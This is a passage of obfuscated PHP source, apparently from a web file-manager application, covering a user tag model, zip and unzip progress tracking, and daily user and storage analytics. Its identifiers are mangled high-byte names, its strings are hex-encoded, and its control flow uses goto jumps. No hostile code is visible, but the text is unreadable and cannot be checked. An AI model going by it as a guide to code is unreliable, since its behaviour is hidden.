str_replace($Ğ—¶âƒÒ[265], $Ğ—¶âƒÒ[18], str_replace($Ğ—¶âƒÒ[265], $Ğ—¶âƒÒ[18], str_replace($Ğ—¶âƒÒ[265], $Ğ—¶âƒÒ[18], $Ü¢š×))), $Ğ—¶âƒÒ[639] => intval($Õ¦µ– ô[$Ğ—¶âƒÒ[504]]), $Ğ—¶âƒÒ[640] => intval($Õ¦µ– ô[$Ğ—¶âƒÒ[89]]), $Ğ—¶âƒÒ[98] => intval($Õ¦µ– ô[$Ğ—¶âƒÒ[98]]), $Ğ—¶âƒÒ[100] => $this->pathInfoFilter($Õ¦µ– ô)); if (!$”û»ë[$Ğ—¶âƒÒ[504]]) { $”û»ë[$Ğ—¶âƒÒ[561]] = $Õ¦µ– ô[$Ğ—¶âƒÒ[561]]; } $¼íÑ¿áø[] = $”û»ë; } $¼íÑ¿áø = array_sort_by($¼íÑ¿áø, $Ğ—¶âƒÒ[97]); return $¼íÑ¿áø; } } goto e²¢ƒï†æÄ; C¤Àéğ»: class UserTagModel extends ModelBaseLight { public $optionType = "\125\x73\x65\x72\56\x74\x61\x67\x4c\151\x73\164"; public $modelType = "\x55\x73\x65\162\117\160\x74\151\157\156"; public $field = array("\x6e\141\x6d\145", "\x73\164\x79\x6c\145", "\x73\x6f\x72\164"); public function listData($ÛµßØÅ˜ = false, $ßÔÔ²…Õ = "\163\157\162\164", $ŒÄ£Æ² = false) { return parent::listData($ÛµßØÅ˜, $ßÔÔ²…Õ, $ŒÄ£Æ²); } public function remove($ÉáÃü¸) { return parent::remove($ÉáÃü¸); } public function add($·ÎÁ‹©, $Æ‰Ö¬¶÷ = "\x6c\x61\142\145\154\x2d\147\162\145\x79\55\x6e\x6f\162\155\x61\x6c") { $¸ï¬ÊÎ =& $_SERVER[‰‰Ş‚€]; if ($this->findByName($·ÎÁ‹©)) { return !1; } $ê‘³·‰ = array($¸ï¬ÊÎ[513] => $·ÎÁ‹©, $¸ï¬ÊÎ[578] => $Æ‰Ö¬¶÷, $¸ï¬ÊÎ[2024] => $this->getSort($¸ï¬ÊÎ[345]) + 1); return parent::insert($ê‘³·‰); } public function update($Ç¿é†Ÿ†, $€¼·¯Ô) { $È™…äÔÂ =& $_SERVER[‰‰Ş‚€]; $î­­ÎÅ§ = $this->listData($Ç¿é†Ÿ†); $¦¾í–× = $this->findByName($€¼·¯Ô[$È™…äÔÂ[42]]); if (!$î­­ÎÅ§ || $¦¾í–× && $¦¾í–×[$È™…äÔÂ[491]] != $î­­ÎÅ§[$È™…äÔÂ[491]]) { return !1; } return parent::update($Ç¿é†Ÿ†, $€¼·¯Ô); } public function moveTop($»çòĞõ) { $áœëæ– =& $_SERVER[‰‰Ş‚€]; $¿…¨üŸ = parent::listData(); $ı¼ª€áı = $this->getSort($áœëæ–[344]); foreach ($¿…¨üŸ as &$ğÑüÔ‘) { if ($ğÑüÔ‘[$áœëæ–[491]] == $»çòĞõ) { $ğÑüÔ‘[$áœëæ–[2044]] = $ı¼ª€áı; continue; } $ğÑüÔ‘[$áœëæ–[2044]] += 1; } unset($ğÑüÔ‘); return parent::resetData($¿…¨üŸ); } public function moveBottom($¹µúÔğ) { $ Ü´áä¦ =& $_SERVER[‰‰Ş‚€]; $ÁÑô…ñ” = $this->getSort($ Ü´áä¦[345]) + 1; return parent::update($¹µúÔğ, array($ Ü´áä¦[2044] => $ÁÑô…ñ”)); } public function resetSort($ÇÃƒµ³Ô) { $§Ê©ß¢© =& $_SERVER[‰‰Ş‚€]; $Šœˆ‹´ò = array(); $ÇÃƒµ³Ô = is_array($ÇÃƒµ³Ô) ? $ÇÃƒµ³Ô : array(); for ($â·Ò = 0; $â·Ò < count($ÇÃƒµ³Ô); $â·Ò++) { $Šœˆ‹´ò[$ÇÃƒµ³Ô[$â·Ò] . $§Ê©ß¢©[22]] = $â·Ò + 1; } $Ôüû×£÷ = parent::listData(); foreach ($Ôüû×£÷ as &$àŠƒ·ğ³) { $”Şœ“ğù = $Šœˆ‹´ò[$àŠƒ·ğ³[$§Ê©ß¢©[491]]]; $àŠƒ·ğ³[$§Ê©ß¢©[2044]] = $”Şœ“ğù ? $”Şœ“ğù : $àŠƒ·ğ³[$§Ê©ß¢©[2044]]; } unset($àŠƒ·ğ³); return parent::resetData($Ôüû×£÷); } private function getSort($Ÿ˜ñıÔĞ) { $ØÜØãòƒ =& $_SERVER[‰‰Ş‚€]; $Ï¢Ï«ÌÄ = parent::listData(); $¹÷ëõÚ = array_to_keyvalue($Ï¢Ï«ÌÄ, $ØÜØãòƒ[22], $ØÜØãòƒ[2044]); if (!$¹÷ëõÚ) { $¹÷ëõÚ = array(0); } $¹Ïúñ’È = $Ÿ˜ñıÔĞ == $ØÜØãòƒ[345] ? max($¹÷ëõÚ) : min($¹÷ëõÚ); return intval($¹Ïúñ’È); } } goto C”ÉŒ‹µ…¼; EëÀİ“º™: class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $çãŞÏÙ‡ =& $_SERVER[‰‰Ş‚€]; parent::startAfter(); Hook::bind($çãŞÏÙ‡[1936], array($this, $çãŞÏÙ‡[1937])); Hook::bind($çãŞÏÙ‡[1317], array($this, $çãŞÏÙ‡[1938])); Hook::bind($çãŞÏÙ‡[1939], array($this, $çãŞÏÙ‡[1940])); $’ïô¨í” =& $this->task; $’ïô¨í”[$çãŞÏÙ‡[1941]] = $çãŞÏÙ‡[1318]; if (!$’ïô¨í”[$çãŞÏÙ‡[1707]]) { $’ïô¨í”[$çãŞÏÙ‡[1707]] = LNG($çãŞÏÙ‡[1942]); } } protected function endAfter() { $Ÿä«ßéÚ =& $_SERVER[‰‰Ş‚€]; parent::endAfter(); Hook::unbind($Ÿä«ßéÚ[1936], array($this, $Ÿä«ßéÚ[1937])); Hook::unbind($Ÿä«ßéÚ[1317], array($this, $Ÿä«ßéÚ[1938])); Hook::unbind($Ÿä«ßéÚ[1939], array($this, $Ÿä«ßéÚ[1940])); } public function updateAfter() { $¦€¿ú‘» =& $_SERVER[‰‰Ş‚€]; $ÃŞ’’ =& $this->task; if (!$ÃŞ’’[$¦€¿ú‘»[1172]] || !$ÃŞ’’[$¦€¿ú‘»[860]]) { if ($ÃŞ’’[$¦€¿ú‘»[1941]] != $¦€¿ú‘»[397]) { return; } } if ($ÃŞ’’[$¦€¿ú‘»[1941]] == $¦€¿ú‘»[1318]) { $äÛ£û = 0; if ($ÃŞ’’[$¦€¿ú‘»[1874]]) { $äÛ£û = $ÃŞ’’[$¦€¿ú‘»[1875]] / $ÃŞ’’[$¦€¿ú‘»[1874]]; } $ÃŞ’’[$¦€¿ú‘»[1822]] = $äÛ£û * 0.3; } else { if ($ÃŞ’’[$¦€¿ú‘»[1941]] == $¦€¿ú‘»[397]) { $äÛ£û = $ÃŞ’’[$¦€¿ú‘»[1821]] / $ÃŞ’’[$¦€¿ú‘»[1172]]; $ÃŞ’’[$¦€¿ú‘»[1822]] = 0.3 + $äÛ£û * 0.4; } else { if ($ÃŞ’’[$¦€¿ú‘»[1941]] == $¦€¿ú‘»[118]) { $×Œ¥Ÿùœ = 0; if ($ÃŞ’’[$¦€¿ú‘»[1876]] == $¦€¿ú‘»[118]) { $×Œ¥Ÿùœ = $ÃŞ’’[$¦€¿ú‘»[1875]]; } $äÛ£û = ($ÃŞ’’[$¦€¿ú‘»[1879]] + $×Œ¥Ÿùœ) / $ÃŞ’’[$¦€¿ú‘»[860]]; $ÃŞ’’[$¦€¿ú‘»[1822]] = 0.3 + 0.4 + $äÛ£û * 0.3; } } } if ($ÃŞ’’[$¦€¿ú‘»[1822]] > 0) { $ş®Õë² = timeFloat() - $ÃŞ’’[$¦€¿ú‘»[1824]] - $ÃŞ’’[$¦€¿ú‘»[1827]]; $ÃŞ’’[$¦€¿ú‘»[1828]] = $ş®Õë² * (1 - $ÃŞ’’[$¦€¿ú‘»[1822]]) / $ÃŞ’’[$¦€¿ú‘»[1822]]; } } public function addFile($ÓÓÓÊŒ) { $Ûá’Ğ³ =& $_SERVER[‰‰Ş‚€]; $‚Î‚½äÏ =& $this->task; $ÑéÔıŒ¿ = IO::info($ÓÓÓÊŒ); $‚Î‚½äÏ[$Ûá’Ğ³[1872]] = $ÑéÔıŒ¿[$Ûá’Ğ³[42]]; $‚Î‚½äÏ[$Ûá’Ğ³[1874]] = $ÑéÔıŒ¿[$Ûá’Ğ³[89]]; $‚Î‚½äÏ[$Ûá’Ğ³[1875]] = 0; $‚Î‚½äÏ[$Ûá’Ğ³[1174]] = $Ûá’Ğ³[1895]; $‚Î‚½äÏ[$Ûá’Ğ³[1876]] = $Ûá’Ğ³[1318]; $‚Î‚½äÏ[$Ûá’Ğ³[860]] = $ÑéÔıŒ¿[$Ûá’Ğ³[89]]; $‚Î‚½äÏ[$Ûá’Ğ³[1172]] = 1; $ø½¼¨Ú¹ = 0; $‚Î‚½äÏ[$Ûá’Ğ³[1883]] = array($Ûá’Ğ³[1884] => $ø½¼¨Ú¹ + 1, $Ûá’Ğ³[513] => $ÑéÔıŒ¿[$Ûá’Ğ³[42]], $Ûá’Ğ³[97] => $ÑéÔıŒ¿[$Ûá’Ğ³[97]], $Ûá’Ğ³[602] => $ÑéÔıŒ¿[$Ûá’Ğ³[602]] ? $ÑéÔıŒ¿[$Ûá’Ğ³[602]] : $ÑéÔıŒ¿[$Ûá’Ğ³[97]]); $this->update(); } public function zipEvent($•ì×Œèı, $§»ôÈØâ, $À¥ï‚¬«, $½ı‘¿…) { $·ÚóÄ²ã =& $_SERVER[‰‰Ş‚€]; $Ûêêåß™ =& $this->task; $Ûêêåß™[$·ÚóÄ²ã[1872]] = get_path_this($§»ôÈØâ); $Ûêêåß™[$·ÚóÄ²ã[1874]] = $½ı‘¿…; $Ûêêåß™[$·ÚóÄ²ã[1875]] = $À¥ï‚¬«; $Ûêêåß™[$·ÚóÄ²ã[1174]] = $•ì×Œèı == $·ÚóÄ²ã[1943] ? $·ÚóÄ²ã[1944] : $·ÚóÄ²ã[1945]; $Ûêêåß™[$·ÚóÄ²ã[1876]] = $·ÚóÄ²ã[22]; $Ûêêåß™[$·ÚóÄ²ã[860]] = $½ı‘¿…; $Ûêêåß™[$·ÚóÄ²ã[1941]] = $·ÚóÄ²ã[397]; $this->update(); } public function unzipAfter($Ì¹¿æç˜) { $â¬Í®Åğ =& $_SERVER[‰‰Ş‚€]; $¾¥¹Ë‚Œ =& $this->task; $¾¥¹Ë‚Œ[$â¬Í®Åğ[1941]] = $â¬Í®Åğ[118]; $ñ¦¤¬­÷ = IO::infoWithChildren($Ì¹¿æç˜); $Í…¿ü¯¾ = 0; $¾¥¹Ë‚Œ[$â¬Í®Åğ[1883]] = array($â¬Í®Åğ[1884] => $Í…¿ü¯¾ + 1, $â¬Í®Åğ[513] => $ñ¦¤¬­÷[$â¬Í®Åğ[42]], $â¬Í®Åğ[97] => $ñ¦¤¬­÷[$â¬Í®Åğ[97]], $â¬Í®Åğ[602] => $ñ¦¤¬­÷[$â¬Í®Åğ[602]] ? $ñ¦¤¬­÷[$â¬Í®Åğ[602]] : $ñ¦¤¬­÷[$â¬Í®Åğ[97]]); if ($ñ¦¤¬­÷[$â¬Í®Åğ[43]] == $â¬Í®Åğ[241]) { $¾¥¹Ë‚Œ[$â¬Í®Åğ[1172]] = 1; } else { $¾¥¹Ë‚Œ[$â¬Í®Åğ[1172]] = $ñ¦¤¬­÷[$â¬Í®Åğ[92]][$â¬Í®Åğ[90]]; } $¾¥¹Ë‚Œ[$â¬Í®Åğ[1174]] = $â¬Í®Åğ[22]; $¾¥¹Ë‚Œ[$â¬Í®Åğ[1876]] = 0; $¾¥¹Ë‚Œ[$â¬Í®Åğ[1821]] = 0; $¾¥¹Ë‚Œ[$â¬Í®Åğ[1874]] = 0; $¾¥¹Ë‚Œ[$â¬Í®Åğ[1875]] = 0; $¾¥¹Ë‚Œ[$â¬Í®Åğ[1872]] = $â¬Í®Åğ[22]; $¾¥¹Ë‚Œ[$â¬Í®Åğ[1879]] = 0; $¾¥¹Ë‚Œ[$â¬Í®Åğ[860]] = $ñ¦¤¬­÷[$â¬Í®Åğ[89]]; $this->update(); self::log($â¬Í®Åğ[1946] . json_encode(array($¾¥¹Ë‚Œ, $ñ¦¤¬­÷))); } public function nameParse($“Ù–ïôî) { $±—Œââ =& $_SERVER[‰‰Ş‚€]; $³¨û›ñ÷ =& $this->task; if ($³¨û›ñ÷[$±—Œââ[1941]] == $±—Œââ[1318]) { $³¨û›ñ÷[$±—Œââ[1941]] = $±—Œââ[397]; $³¨û›ñ÷[$±—Œââ[1879]] = 0; $³¨û›ñ÷[$±—Œââ[860]] = 0; } $Ë¯¢Ô = get_path_this($“Ù–ïôî); if (strstr($Ë¯¢Ô, $±—Œââ[20])) { $³¨û›ñ÷[$±—Œââ[1821]] += 1; $³¨û›ñ÷[$±—Œââ[1172]] += 1; } $³¨û›ñ÷[$±—Œââ[1872]] = $“Ù–ïôî; $this->update(); } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $„¶‘ÉãÔ =& $_SERVER[‰‰Ş‚€]; parent::startAfter(); Hook::bind($„¶‘ÉãÔ[1947], array($this, $„¶‘ÉãÔ[1937])); Hook::bind($„¶‘ÉãÔ[1939], array($this, $„¶‘ÉãÔ[1940])); $ç‹·Ÿ²İ =& $this->task; $ç‹·Ÿ²İ[$„¶‘ÉãÔ[1941]] = $„¶‘ÉãÔ[1318]; if (!$ç‹·Ÿ²İ[$„¶‘ÉãÔ[1707]]) { $ç‹·Ÿ²İ[$„¶‘ÉãÔ[1707]] = LNG($„¶‘ÉãÔ[1948]); } } protected function endAfter() { $–²âàóº =& $_SERVER[‰‰Ş‚€]; parent::endAfter(); Hook::unbind($–²âàóº[1947], array($this, $–²âàóº[1937])); Hook::unbind($–²âàóº[1939], array($this, $–²âàóº[1940])); } public function updateAfter() { $˜üÕª§ =& $_SERVER[‰‰Ş‚€]; $İúÄÌí§ =& $this->task; if (!$İúÄÌí§[$˜üÕª§[1172]] || !$İúÄÌí§[$˜üÕª§[860]]) { return; } if ($İúÄÌí§[$˜üÕª§[1941]] == $˜üÕª§[1318]) { $œœ¼éûğ = $İúÄÌí§[$˜üÕª§[1875]]; if ($İúÄÌí§[$˜üÕª§[1876]] != $˜üÕª§[1318]) { $œœ¼éûğ = 0; } $™û É¤Ì = ($İúÄÌí§[$˜üÕª§[1879]] + $œœ¼éûğ) / $İúÄÌí§[$˜üÕª§[860]]; $İúÄÌí§[$˜üÕª§[1822]] = $™û É¤Ì * 0.3; } else { if ($İúÄÌí§[$˜üÕª§[1941]] == $˜üÕª§[397]) { $™û É¤Ì = $İúÄÌí§[$˜üÕª§[1821]] / $İúÄÌí§[$˜üÕª§[1172]]; $İúÄÌí§[$˜üÕª§[1822]] = 0.3 + $™û É¤Ì * 0.5; } else { if ($İúÄÌí§[$˜üÕª§[1941]] == $˜üÕª§[118]) { $™û É¤Ì = 0; if ($İúÄÌí§[$˜üÕª§[1874]]) { $™û É¤Ì = $İúÄÌí§[$˜üÕª§[1875]] / $İúÄÌí§[$˜üÕª§[1874]]; } $İúÄÌí§[$˜üÕª§[1822]] = 0.3 + 0.5 + $™û É¤Ì * 0.2; } } } if ($İúÄÌí§[$˜üÕª§[1822]] > 0) { $—‘„Ïï = timeFloat() - $İúÄÌí§[$˜üÕª§[1824]] - $İúÄÌí§[$˜üÕª§[1827]]; $İúÄÌí§[$˜üÕª§[1828]] = $—‘„Ïï * (1 - $İúÄÌí§[$˜üÕª§[1822]]) / $İúÄÌí§[$˜üÕª§[1822]]; } } public function copyFileStart($‘æŸ˜·, $ë°öç´², $Ñ’º½¿ˆ, $Ù ‡, $½’Ü…ñû, $†ÄÂ»À‰) { $ÑÇ‚¶ëŠ =& $_SERVER[‰‰Ş‚€]; parent::copyFileStart($‘æŸ˜·, $ë°öç´², $Ñ’º½¿ˆ, $Ù ‡, $½’Ü…ñû, $†ÄÂ»À‰); $øÈæÎô =& $this->task; if ($øÈæÎô[$ÑÇ‚¶ëŠ[1941]] == $ÑÇ‚¶ëŠ[397]) { $øÈæÎô[$ÑÇ‚¶ëŠ[1941]] = $ÑÇ‚¶ëŠ[118]; } $this->update(); } public function copyFileEnd($›èƒŸ†€, $¸™ˆïİ”, $½ªÛ‚¾±, $Š«‰ğ•ò, $œßíãè, $¥ö£„¡) { $¤ÙÃ‡˜Ş =& $_SERVER[‰‰Ş‚€]; $ô·Şö—Õ =& $this->task; $ô·Şö—Õ[$¤ÙÃ‡˜Ş[1875]] = $ô·Şö—Õ[$¤ÙÃ‡˜Ş[1874]]; $ô·Şö—Õ[$¤ÙÃ‡˜Ş[1879]] += $ô·Şö—Õ[$¤ÙÃ‡˜Ş[1874]]; $ô·Şö—Õ[$¤ÙÃ‡˜Ş[1876]] = $¤ÙÃ‡˜Ş[22]; $this->update(); } public function zipEvent($•ØÍ¥ã, $àîœÒµ½, $Çëô«š, $ÚÁÀŒ‘â) { $™šĞ£¥ =& $_SERVER[‰‰Ş‚€]; $ÆÀüŠØü =& $this->task; $ÆÀüŠØü[$™šĞ£¥[1872]] = get_path_this($àîœÒµ½); $ÆÀüŠØü[$™šĞ£¥[1874]] = $ÚÁÀŒ‘â; $ÆÀüŠØü[$™šĞ£¥[1875]] = $Çëô«š; $ÆÀüŠØü[$™šĞ£¥[1174]] = $•ØÍ¥ã == $™šĞ£¥[1949] ? $™šĞ£¥[1944] : $™šĞ£¥[1945]; $ÆÀüŠØü[$™šĞ£¥[1876]] = $™šĞ£¥[22]; $ÆÀüŠØü[$™šĞ£¥[860]] = $ÚÁÀŒ‘â; $ÆÀüŠØü[$™šĞ£¥[1941]] = $™šĞ£¥[397]; $this->update(); } public function nameParse($¯¬õÔ¦—) { $ê ‘ç‹½ =& $_SERVER[‰‰Ş‚€]; $¼À¥Úœö =& $this->task; if ($¼À¥Úœö[$ê ‘ç‹½[1821]] < $¼À¥Úœö[$ê ‘ç‹½[1172]]) { $­—Ñ·ş = get_path_this($¯¬õÔ¦—); if (strstr($­—Ñ·ş, $ê ‘ç‹½[20])) { $¼À¥Úœö[$ê ‘ç‹½[1821]] += 1; } } if ($¼À¥Úœö[$ê ‘ç‹½[1941]] == $ê ‘ç‹½[1318]) { $¼À¥Úœö[$ê ‘ç‹½[1941]] = $ê ‘ç‹½[397]; } $¼À¥Úœö[$ê ‘ç‹½[1872]] = $¯¬õÔ¦—; $this->update(); } } class AnalysisModel extends ModelBaseLight { public function init($Ü½­°) { $ƒ¨ûŸÙ =& $_SERVER[‰‰Ş‚€]; $şï§³½˜ = array($ƒ¨ûŸÙ[685] => array($ƒ¨ûŸÙ[43] => $ƒ¨ûŸÙ[1950], $ƒ¨ûŸÙ[360] => array($ƒ¨ûŸÙ[293], $ƒ¨ûŸÙ[862], $ƒ¨ûŸÙ[1951], $ƒ¨ûŸÙ[1952])), $ƒ¨ûŸÙ[1953] => array($ƒ¨ûŸÙ[43] => $ƒ¨ûŸÙ[1954], $ƒ¨ûŸÙ[360] => array($ƒ¨ûŸÙ[293], $ƒ¨ûŸÙ[860], $ƒ¨ûŸÙ[1955], $ƒ¨ûŸÙ[1956], $ƒ¨ûŸÙ[1957]))); if (!isset($şï§³½˜[$Ü½­°])) { return !1; } $this->optionType = $şï§³½˜[$Ü½­°][$ƒ¨ûŸÙ[43]]; $this->field = $şï§³½˜[$Ü½­°][$ƒ¨ûŸÙ[360]]; return !0; } public function listData($ˆ¤³İŒ = false, $Â‰Ô¤¿ = "\155\157\x64\x69\x66\x79\x54\x69\155\x65", $ãô”ú³§ = false) { return parent::listData($ˆ¤³İŒ, $Â‰Ô¤¿, $ãô”ú³§); } public function trendList($ˆÏ¸í©º) { $ùè‘şé =& $_SERVER[‰‰Ş‚€]; $œ¬ÙÛÅ¢ = $this->listData(); if ($œ¬ÙÛÅ¢) { $»²ôÓÒ½ = end($œ¬ÙÛÅ¢); $€áğ¿âö = date($ùè‘şé[1958], strtotime($ùè‘şé[1959])); if ($»²ôÓÒ½[$ùè‘şé[293]] == $€áğ¿âö) { return $œ¬ÙÛÅ¢; } $­ĞĞ¼íù = strtotime($»²ôÓÒ½[$ùè‘şé[293]]); } if (!isset($­ĞĞ¼íù)) { $šö‡ ¿Š = $ˆÏ¸í©º == $ùè‘şé[685] ? $ùè‘şé[617] : $ùè‘şé[929]; $­ĞĞ¼íù = Model($šö‡ ¿Š)->min($ùè‘şé[242]); } $ä¨÷Ø¼¾ = $ùè‘şé[1960] . ucfirst($ˆÏ¸í©º); $µŒÑÕí° = $this->dateList($­ĞĞ¼íù); foreach ($µŒÑÕí° as $€áğ¿âö) { $this->{$ä¨÷Ø¼¾}($€áğ¿âö); } return $this->listData(); } private function dateList($§è –ï) { $ï‰¼µÜœ =& $_SERVER[‰‰Ş‚€]; $ˆ¿Íò‡ç = $§è –ï; $ÑÓ—Ó = strtotime($ï‰¼µÜœ[1959]); $–úİº“ = array(); while ($ˆ¿Íò‡ç <= $ÑÓ—Ó) { $–úİº“[] = date($ï‰¼µÜœ[1958], $ˆ¿Íò‡ç); $ˆ¿Íò‡ç = strtotime($ï‰¼µÜœ[1961], $ˆ¿Íò‡ç); } return $–úİº“; } public function _recordUser($ù¤ëø™ = '') { $†¢ê×õÃ =& $_SERVER[‰‰Ş‚€]; $²”úÈİÕ = strtotime(date($†¢ê×õÃ[1962], strtotime($ù¤ëø™))); $ÆÌ²Ë‰… = strtotime(date($†¢ê×õÃ[1963], strtotime($ù¤ëø™))); $—¾íäŒ = array($†¢ê×õÃ[242] => array($†¢ê×õÃ[1123], $ÆÌ²Ë‰…)); $·ë·›é€ = Model($†¢ê×õÃ[617])->where($—¾íäŒ)->count($†¢ê×õÃ[1820]); $—¾íäŒ[$†¢ê×õÃ[242]] = array($†¢ê×õÃ[417], array($²”úÈİÕ, $ÆÌ²Ë‰…)); $—›ŠĞ¨• = Model($†¢ê×õÃ[617])->where($—¾íäŒ)->count($†¢ê×õÃ[1820]); $—¾íäŒ[$†¢ê×õÃ[43]] = $†¢ê×õÃ[1964]; $Â¾àŠ º = Model($†¢ê×õÃ[1965])->where($—¾íäŒ)->count($†¢ê×õÃ[1966]); $–æŞ¥Å’ = array($†¢ê×õÃ[293] => $ù¤ëø™, $†¢ê×õÃ[862] => (int) $·ë·›é€, $†¢ê×õÃ[1951] => (int) $—›ŠĞ¨•, $†¢ê×õÃ[1952] => (int) $Â¾àŠ º); return $this->insert($–æŞ¥Å’); } public function _recordStore($ƒŒı·ı÷ = '') { $ê¥Åï›§ =& $_SERVER[‰‰Ş‚€]; $µ£µî›Ã = strtotime(date($ê¥Åï›§[1963], strtotime($ƒŒı·ı÷))); $¢ú‡Œş = array($ê¥Åï›§[242] => array($ê¥Åï›§[1123], $µ£µî›Ã)); $şèğ¬ØĞ = Model($ê¥Åï›§[564])->where($¢ú‡Œş)->sum($ê¥Åï›§[89]); $¢ú‡Œş[$ê¥Åï›§[504]] = 0; $¿½§¸„ = Model($ê¥Åï›§[929])->where($¢ú‡Œş)->sum($ê¥Åï›§[89]); $¢ú‡Œş[$ê¥Åï›§[199]] = 1; $½ääš = Model($ê¥Åï›§[929])->where($¢ú‡Œş)->sum($ê¥Åï›§[89]); $¢ú‡Œş[$ê¥Åï›§[199]] = 2; $¯á‹Úñ¥ = Model($ê¥Åï›§[929])->where($¢ú‡Œş)->sum($ê¥Åï›§[89]); $ƒÂµö£Ì = array($ê¥Åï›§[293] => $ƒŒı·ı÷, $ê¥Åï›§[860] => (int) $¿½§¸„, $ê¥Åï›§[1955] => (int) $şèğ¬ØĞ, $ê¥Åï›§[1956] => (int) $½ääš, $ê¥Åï›§[1957] => (int) $¯á‹Úñ¥); return $this->insert($ƒÂµö£Ì); } public function trend($÷¦éÚ¸•, $š§ò­†) { $òÃ¨Åè =& $_SERVER[‰‰Ş‚€]; if (!$this->init($÷¦éÚ¸•)) { return !1; } $¡â¦á•ª = $this->trendList($÷¦éÚ¸•); if ($¡â¦á•ª && $š§ò­† != $òÃ¨Åè[1792]) { $Š¿ã²®¢ = $¡â¦á•ª[0][$òÃ¨Åè[293]]; $†À”ÔÉ = $this->validDate($š§ò­†, $Š¿ã²®¢); $À×Í™§ = array(); $¸õ™ê©Î = array_to_keyvalue($¡â¦á•ª, $òÃ¨Åè[293]); foreach ($†À”ÔÉ as $Ş½ú˜Ç) { if (isset($¸õ™ê©Î[$Ş½ú˜Ç])) { $…¿¤Ğá = $¸õ™ê©Î[$Ş½ú˜Ç]; } else { $…¿¤Ğá = end($¡â¦á•ª); $…¿¤Ğá[$òÃ¨Åè[293]] = $Ş½ú˜Ç; if ($÷¦éÚ¸• == $òÃ¨Åè[685]) { $…¿¤Ğá[$òÃ¨Åè[1951]] = $…¿¤Ğá[$òÃ¨Åè[1952]] = 0; } } $À×Í™§[] = $…¿¤Ğá; } $¡â¦á•ª = $À×Í™§; } $ú³…´âÓ = array($òÃ¨Åè[685] => array($òÃ¨Åè[862] => LNG($òÃ¨Åè[1967]), $òÃ¨Åè[1951] => LNG($òÃ¨Åè[1968]), $òÃ¨Åè[1952] => LNG($òÃ¨Åè[1969])), $òÃ¨Åè[1953] => array($òÃ¨Åè[860] => LNG($òÃ¨Åè[1970]), $òÃ¨Åè[1955] => LNG($òÃ¨Åè[1971]), $òÃ¨Åè[1956] => LNG($òÃ¨Åè[1972]), $òÃ¨Åè[1957] => LNG($òÃ¨Åè[1973]))); $ğØ«æÂª = array($òÃ¨Åè[685] => $òÃ¨Åè[1974], $òÃ¨Åè[1953] => $òÃ¨Åè[89]); if (empty($¡â¦á•ª)) { $Ş½ú˜Ç = date($òÃ¨Åè[1958], strtotime($òÃ¨Åè[1959])); $—êÃ‡† = array($òÃ¨Åè[293] => $Ş½ú˜Ç); foreach ($ú³…´âÓ[$÷¦éÚ¸•] as $²‚»ìş => $åÄçñİÂ) { $—êÃ‡†[$²‚»ìş] = 0; } $¡â¦á•ª[] = $—êÃ‡†; } $˜ÊºìÆÑ = array(); foreach ($¡â¦á•ª as $åÄçñİÂ) { if ($÷¦éÚ¸• == $òÃ¨Åè[1953] && $åÄçñİÂ[$òÃ¨Åè[1955]] > $åÄçñİÂ[$òÃ¨Åè[860]]) { $åÄçñİÂ[$òÃ¨Åè[1955]] = $åÄçñİÂ[$òÃ¨Åè[860]]; } foreach ($ú³…´âÓ[$÷¦éÚ¸•] as $²‚»ìş => $ŠÜ«Óé™) { $…¿¤Ğá = array($òÃ¨Åè[293] => $åÄçñİÂ[$òÃ¨Åè[293]], $òÃ¨Åè[1707] => $ŠÜ«Óé™); $…¿¤Ğá[$ğØ«æÂª[$÷¦éÚ¸•]] = isset($åÄçñİÂ[$²‚»ìş]) ? $åÄçñİÂ[$²‚»ìş] : 0; $˜ÊºìÆÑ[] = $…¿¤Ğá; } } return $˜ÊºìÆÑ; } public function validDate($ÆÏ¬Ç¾, $ŞÓêÄÚ) { $†êìë§– =& $_SERVER[‰‰Ş‚€]; $ÈÁßŸ¬Ú = date($†êìë§–[1958], strtotime($†êìë§–[1959])); $ú‡Áù€ = array($ÈÁßŸ¬Ú); switch ($ÆÏ¬Ç¾) { case $†êìë§–[1799]: $ÁŸÉ‰â• = mktime(0, 0, 0, date($†êìë§–[1975]), date($†êìë§–[1498]) - date($†êìë§–[1587]) + 7 - 7, date($†êìë§–[1976])); $¡í°¥ë¾ = 0; do { $æ©Å—üş = date($†êìë§–[1958], $ÁŸÉ‰â• - 3600 * 24 * 7 * $¡í°¥ë¾); $ú‡Áù€[] = $æ©Å—üş; $¡í°¥ë¾++; } while ($ŞÓêÄÚ < $æ©Å—üş); break; case $†êìë§–[1797]: $¡í°¥ë¾ = 1; do { $º¶íğ‰ = date($†êìë§–[1977], strtotime("\x2d\40{$¡í°¥ë¾}\40\x6d\157\x6e\164\150\x73")); $ú‡Áù€[] = $º¶íğ‰; $¡í°¥ë¾++; } while ($ŞÓêÄÚ < $º¶íğ‰); break; case $†êìë§–[1978]: $á€Şï¶ = (int) date($†êìë§–[1976], strtotime($ŞÓêÄÚ)); $ÜÀı¶Ùó = (int) date($†êìë§–[1976]); if ($á€Şï¶ >= $ÜÀı¶Ùó) { break; } for ($á€Şï¶; $á€Şï¶ < $ÜÀı¶Ùó; $á€Şï¶++) { $ú‡Áù€[] = $á€Şï¶ . $†êìë§–[1979]; } break; default: break; } if ($ŞÓêÄÚ > end($ú‡Áù€)) { array_pop($ú‡Áù€); } sort($ú‡Áù€); return $ú‡Áù€; } public function listTable($§ÄÓ¤ö¨) { $ßä‡³¸– = ucfirst($§ÄÓ¤ö¨); return Model($ßä‡³¸–)->listData(); } public function option($’øıÁÃ) { return call_user_func_array(array($this, $_SERVER[‰‰Ş‚€][1980] . ucfirst($’øıÁÃ)), array()); } private function optionUser() { $ªÀµàÆ… =& $_SERVER[‰‰Ş‚€]; $²Ë°µé = Model($ªÀµàÆ…[617])->count($ªÀµàÆ…[1820]); $Ï¨Æ—äŠ = Model($ªÀµàÆ…[617])->where($ªÀµàÆ…[1981])->count($ªÀµàÆ…[1820]); $çÄï†Ú = intval($GLOBALS[$ªÀµàÆ…[16]][$ªÀµàÆ…[433]][$ªÀµàÆ…[1765]]) / 3600; $ı¨òÃ¦– = strtotime("\x2d{$çÄï†Ú}\40\150\x6f\165\x72\163"); $ƒä™¨¡¶ = strtotime(date($ªÀµàÆ…[1962])); if ($ı¨òÃ¦– < $ƒä™¨¡¶) { $ı¨òÃ¦– = $ƒä™¨¡¶; } $õÆÍ÷÷Ø = array($ªÀµàÆ…[1982] => array($ªÀµàÆ…[1124], $ı¨òÃ¦–)); $’ÏÂÁ Ó = (int) Model($ªÀµàÆ…[617])->where($õÆÍ÷÷Ø)->count($ªÀµàÆ…[1820]); if 